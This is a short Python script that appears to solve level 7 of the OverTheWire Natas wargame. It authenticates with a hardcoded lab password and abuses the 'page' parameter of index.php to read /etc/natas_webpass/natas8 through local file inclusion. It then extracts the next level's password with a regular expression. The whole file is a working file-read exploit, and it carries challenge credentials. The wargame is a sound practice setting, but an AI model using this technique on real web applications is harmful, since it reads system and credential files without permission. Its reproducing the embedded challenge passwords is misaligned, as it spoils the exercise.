import requests
import re

username ='natas7'
password ='7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

responce = session.get(url + "index.php?page=/etc/natas_webpass/natas8", auth = (username, password))
content = responce.text

# print(session.cookies['loggedin'])
print (content)

print ("password for natas8 is = " + re.findall('<br>\n(.*)\n\n',content)[0])